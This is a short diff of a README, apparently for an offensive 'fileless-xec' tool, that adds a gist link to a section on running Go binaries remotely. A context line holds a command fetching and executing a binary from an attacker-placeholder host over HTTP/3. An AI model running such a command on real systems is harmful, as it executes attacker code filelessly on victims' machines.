@@ -76,6 +76,8 @@ fileless-xec --http3 https://[attacker_ip]:6121/[binary_name]
 
 ## "Remote go": execute go binaries without having go installed locally
 
+For a better/shorter solution see [this gist](https://gist.github.com/ariary/7bd45b954657ed841c5dc9937bd3dc26)
+
 ### Pre-requisites
 
 * Attacker machine: 
